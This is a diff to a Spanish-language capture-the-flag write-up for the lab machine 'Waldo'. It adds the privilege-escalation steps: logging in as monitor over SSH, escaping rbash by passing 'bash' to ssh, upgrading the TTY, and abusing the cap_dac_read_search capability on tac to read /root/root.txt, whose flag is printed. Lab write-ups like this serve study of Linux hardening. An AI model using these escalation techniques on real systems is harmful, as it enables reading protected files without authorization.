@@ -17,7 +17,7 @@ La resolución de la máquina presenta las siguiente fases:
 * Escalada de privilegios
     * Escape del contenedor
     * Escape de la Restricted Shell
-    * Abussing de capabilities
+    * Abussing de capabilities - cap_dac_read_search+ei
 
 # Fase de Reconocimiento
 
@@ -241,12 +241,34 @@ desde aqui ya se puede ver la flag de usuario
 
 ## Fase de Escalación de Privilegios
 
-Algo singular de esta maquina, es que parece que fuese un contenedor
+Algo singular de esta maquina, es que parece que fuese un contenedor en alpine; el cual no tiene muchas herramientas sin embargo uno se encuentra en la misma ip de la maquina
+
+> waldo:~/.ssh$ ip a
+
+```console
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP qlen 1000
+    link/ether 00:50:56:b9:e8:ea brd ff:ff:ff:ff:ff:ff
+    inet 10.10.10.87/24 brd 10.10.10.255 scope global ens33
+       valid_lft forever preferred_lft forever
+3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN 
+    link/ether 02:42:24:b9:2e:83 brd ff:ff:ff:ff:ff:ff
+    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
+       valid_lft forever preferred_lft forever
+```
+
+Algo inusual es que al ver las autorized_keys observamos que la clave publica parece ser creada desde el usuario llamado monitor y un dominio llamado waldo
+
 > waldo:~$ cat .ssh/authorized_keys ; echo
 
 ```console
 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzuzK0MT740dpYH17403dXm3UM/VNgdz7ijwPfraXk3B/oKmWZHgkfqfg1xx2bVlT6oHvuWLxk6/KYG0gRjgWbTtfg+q3jN40F+opaQ5zJXVMtbp/zuzQVkGFgCLMas014suEHUhkiOkNUlRtJcbqzZzECV7XhyP6mcSJFOzIyKrWckJJ0YJz+A2lb8AA0g3i9b0qyUuqIAQMl9yFjnmwInnXrZj34jXHOoXx71vXbBVeKu82jw8sacUlXDpIeGY8my572+MAh4f6f7leRtzz/qlx6jCqz26NGQ3Mf1PWUmrgXHVW+L3cNqrdtnd2EghZpZp+arOD6NJOFJY4jBHvf monitor@waldo
 ```
+
+revisamo el archivo `/etc/hosts` y vemos que tiene resolución al nombre waldo a la ip 127.0.1.1
 
 > waldo:~$ cat /etc/hosts 
 
@@ -255,6 +277,149 @@ ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzuzK0MT740dpYH17403dXm3UM/VNgdz7ijwPfraXk
 127.0.1.1	waldo
 ```
 
+por tanto probamos conectarnos con una sesion ssh a `monitor@waldo`
+
+> waldo:~/.ssh$ ssh -i .monitor monitor@waldo
+
+```console
+Linux waldo 4.9.0-6-amd64 #1 SMP Debian 4.9.88-1 (2018-04-29) x86_64
+           &.                                                                  
+          @@@,@@/ %                                                            
+       #*/%@@@@/.&@@,                                                          
+   @@@#@@#&@#&#&@@@,*%/                                                        
+   /@@@&###########@@&*(*                                                      
+ (@################%@@@@@.     /**                                             
+ @@@@&#############%@@@@@@@@@@@@@@@@@@@@@@@@%((/                               
+ %@@@@%##########&@@@....                 .#%#@@@@@@@#                         
+ @@&%#########@@@@/                        */@@@%(((@@@%                       
+    @@@#%@@%@@@,                       *&@@@&%(((#((((@@(                      
+     /(@@@@@@@                     *&@@@@%((((((((((((#@@(                     
+       %/#@@@/@ @#/@          ..@@@@%(((((((((((#((#@@@@@@@@@@@@&#,            
+          %@*(@#%@.,       /@@@@&(((((((((((((((&@@@@@@&#######%%@@@@#    &    
+        *@@@@@#        .&@@@#(((#(#((((((((#%@@@@@%###&@@@@@@@@@&%##&@@@@@@/   
+       /@@          #@@@&#(((((((((((#((@@@@@%%%%@@@@%#########%&@@@@@@@@&     
+      *@@      *%@@@@#((((((((((((((#@@@@@@@@@@%####%@@@@@@@@@@@@###&@@@@@@@&  
+      %@/ .&%@@%#(((((((((((((((#@@@@@@@&#####%@@@%#############%@@@&%##&@@/   
+      @@@@@@%(((((((((((##(((@@@@&%####%@@@%#####&@@@@@@@@@@@@@@@&##&@@@@@@@@@/
+     @@@&(((#((((((((((((#@@@@@&@@@@######@@@###################&@@@&#####%@@* 
+     @@#(((((((((((((#@@@@%&@@.,,.*@@@%#####@@@@@@@@@@@@@@@@@@@%####%@@@@@@@@@@
+     *@@%((((((((#@@@@@@@%#&@@,,.,,.&@@@#####################%@@@@@@%######&@@.
+       @@@#(#&@@@@@&##&@@@&#@@/,,,,,,,,@@@&######&@@@@@@@@&&%######%@@@@@@@@@@@
+        @@@@@@&%&@@@%#&@%%@@@@/,,,,,,,,,,/@@@@@@@#/,,.*&@@%&@@@@@@&%#####%@@@@.
+          .@@@###&@@@%%@(,,,%@&,.,,,,,,,,,,,,,.*&@@@@&(,*@&#@%%@@@@@@@@@@@@*   
+            @@%##%@@/@@@%/@@@@@@@@@#,,,,.../@@@@@%#%&@@@@(&@&@&@@@@(           
+            .@@&##@@,,/@@@@&(.  .&@@@&,,,.&@@/         #@@%@@@@@&@@@/          
+           *@@@@@&@@.*@@@          %@@@*,&@@            *@@@@@&.#/,@/          
+          *@@&*#@@@@@@@&     #@(    .@@@@@@&    ,@@@,    @@@@@(,@/@@           
+          *@@/@#.#@@@@@/    %@@@,   .@@&%@@@     &@&     @@*@@*(@@#            
+           (@@/@,,@@&@@@            &@@,,(@@&          .@@%/@@,@@              
+             /@@@*,@@,@@@*         @@@,,,,,@@@@.     *@@@%,@@**@#              
+               %@@.%@&,(@@@@,  /&@@@@,,,,,,,%@@@@@@@@@@%,,*@@,#@,              
+                ,@@,&@,,,,(@@@@@@@(,,,,,.,,,,,,,,**,,,,,,.*@/,&@               
+                 &@,*@@.,,,,,..,,,,&@@%/**/@@*,,,,,&(.,,,.@@,,@@               
+                 /@%,&@/,,,,/@%,,,,,*&@@@@@#.,,,,,.@@@(,,(@@@@@(               
+                  @@*,@@,,,#@@@&*..,,,,,,,,,,,,/@@@@,*(,,&@/#*                 
+                  *@@@@@(,,@*,%@@@@@@@&&#%@@@@@@@/,,,,,,,@@                    
+                       @@*,,,,,,,,,.*/(//*,..,,,,,,,,,,,&@,                    
+                        @@,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,@@                     
+                        &@&,,,,,,,,,,,,,,,,,,,,,,,,,,,,&@#                     
+                         %@(,,,,,,,,,,,,,,,,,,,,,,,,,,,@@                      
+                         ,@@,,,,,,,,@@@&&&%&@,,,,,..,,@@,                      
+                          *@@,,,,,,,.,****,..,,,,,,,,&@@                       
+                           (@(,,,.,,,,,,,,,,,,,,.,,,/@@                        
+                           .@@,,,,,,,,,,,,,...,,,,,,@@                         
+                            ,@@@,,,,,,,,,,,,,,,,.(@@@                          
+                              %@@@@&(,,,,*(#&@@@@@@,     
+                              
+                            Here's Waldo, where's root?
+Last login: Tue Jul 24 08:09:03 2018 from 127.0.0.1
+-rbash: alias: command not found
+monitor@waldo:~$ 
+```
+
+Observamos que nos encontramos en una restricted bash y tenemos los comandos bastante limitados
+
+> monitor@waldo:~$ cd ..
+
+```console
+-rbash: cd: restricted
+```
+
+Por tanto nos salimos de la maquina y vemos que podemos ejecutar comandos que no estaban permitidos antes de la siguiente manera
+
+> waldo:~$ ssh -i .ssh/.monitor monitor@waldo whoami
+```console
+monitor
+```
+
+Ingresamos a una bash con el siguiente comando:
+
+> waldo:~$ ssh -i .ssh/.monitor monitor@waldo bash
+> whoami
+
+```console
+monitor
+```
+
+para tener una bash en condiciones realizamos lo siguiente:
+
+> script /dev/null -c bash                 
+
+```console
+Script started, file is /dev/null
+monitor@waldo:~$
+```
+
+Se presiona las siguientes dos teclas para salir del proceso sin pararlo `ctrl` + `Z`
+
+dado que el `PATH` es muy pequeño en la máquina, se lo agranda de la siguiente manera para que tenga el comando reset
+
+> export PATH=/usr/bin:$PATH
+
+> stty raw -echo; fg
+>
+> reset xterm
+
+```console
+monitor@waldo:~$
+```
+
+Para obtener todos los comandos posibles nos traemos el PATH de nuestra máquina
+
+> export PATH=/usr/lib/oracle/21/client64/bin:/home/mzapata/.local/bin:/snap/bin:/usr/sandbox/:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/share/games:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/local/sbin:/usr/bin:/home/mzapata/.fzf/bin:/root/.local/bin
+
+y arreglamos la tty de la siguiente manera
+
+> monitor@waldo:~$ export TERM=xterm
+>
+> monitor@waldo:~$ stty rows 40 columns 187
+>
+> monitor@waldo:~$ export SHELL=/bin/bash
+
+Vemos que nos encontramos en la misma maquina:
+
+> monitor@waldo:~$ hostname -I
+
+```console
+10.10.10.87 172.17.0.1 
+```
+
+Revisamos capabilities que podamos explotar y encontramos que `tac` tiene la capabilitie `cap_dac_read_search+ei` el cual permite revisar archivos como usuario con privilegios
+
+> monitor@waldo:~$ getcap -r / 2>/dev/null
+
+```console
+/usr/bin/tac = cap_dac_read_search+ei
+/home/monitor/app-dev/v0.1/logMonitor-0.1 = cap_dac_read_search+ei
+```
+
+por tanto se podría obtener la flag con el siguiente comando:
+
+> monitor@waldo:~$ tac /root/root.txt
+
+```console
+8fb67c84418be6e45fbd348fd4584f6c
+```
 
 ## Estructura del directorio
 
